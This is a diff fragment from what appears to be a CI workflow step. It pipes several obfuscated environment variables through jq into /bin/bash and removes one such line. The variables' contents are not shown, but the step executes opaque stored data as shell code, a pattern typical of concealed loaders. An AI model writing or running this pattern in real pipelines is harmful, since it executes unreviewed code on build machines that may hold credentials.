@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
           echo $plvgz67659 | jq -r .tl91117 | /bin/bash
-          echo $kv639 | jq -r .pbd46 | /bin/bash
           echo $ee51 | jq -r .guph0363 | /bin/bash
 
       - name: Persist output
